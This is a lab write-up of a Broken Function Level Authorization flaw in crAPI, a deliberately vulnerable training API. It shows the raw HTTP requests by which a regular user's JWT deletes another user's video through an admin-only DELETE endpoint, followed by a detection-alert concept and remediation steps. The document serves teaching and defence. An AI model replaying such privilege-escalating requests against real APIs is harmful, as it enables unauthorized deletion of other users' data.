# crAPI BFLA Write-Up — Admin Video Deletion via Regular JWT

## Attack Chain
**Recon:** Identified privileged route structure under `/identity/api/v2/admin/*` while reviewing API traffic in Burp (Proxy → HTTP history) and testing endpoint variations.  
**Exploit:** Used a **regular user JWT** to send `DELETE` to an **admin-only function**: `/identity/api/v2/admin/videos/53`.  
**Proof:** Video deletion succeeded (**HTTP 200**) with a non-admin token: `"User video deleted successfully."`

---

## Vulnerability
**Broken Function Level Authorization (BFLA) — OWASP API Top 10 2023 (API5)**

- **Admin function exposed:** `DELETE /identity/api/v2/admin/videos/{id}`
- **Missing role enforcement:** endpoint accepts any authenticated caller, regardless of privilege.
- **Expected control (missing):**
  ```pseudo
  if user.role != "admin":
      return 403
Why it’s BFLA (not BOLA): This is about unauthorized access to a privileged function (admin delete), not just object ownership checks.

## Evidence (Requests / Responses)
Baseline — User A checks his own video
Object ID (User A video): 53

GET /identity/api/v2/user/videos/53 HTTP/1.1
Host: crapi.localtest.me:8888
Authorization: Bearer <userA_jwt>
✅ 200 OK — video metadata returned.

Expected Failure — User B tries “user delete” path
DELETE /identity/api/v2/user/videos/53 HTTP/1.1
Host: crapi.localtest.me:8888
Authorization: Bearer <userB_jwt>
❌ 404 — "Sorry, Didn't get any profile video name for the user."

Exploit — User B deletes User A video via admin function (BFLA)
DELETE /identity/api/v2/admin/videos/53 HTTP/1.1
Host: crapi.localtest.me:8888
Authorization: Bearer <userB_jwt>
Content-Type: application/json
✅ 200 OK — "User video deleted successfully."

## Akamai Detection
Alert: "Low-privilege user accessing admin function"

Pattern: Regular user hitting /identity/api/v2/admin/* paths (especially destructive verbs like DELETE)

Risk score: 88/100 (privileged route + destructive action + role mismatch)

Note: While BFLA can’t be fully prevented purely at the edge (because the app must enforce authorization), Akamai can surface anomalous role usage and admin-route access patterns that deviate from normal user baselines, enabling rapid detection, triage, and mitigation.

## Remediation
Enforce function-level authorization on admin routes (deny-by-default)

Require admin role / permission for /admin/* endpoints

Centralize authorization logic (RBAC/ABAC policy checks per action)

Add audit logs for privileged operations

Include actor identity, role/claims, target resource, timestamp

Defense-in-depth hardening

Separate admin surface area (distinct service/host if possible)

Rate-limit / add anomaly rules for privileged endpoints

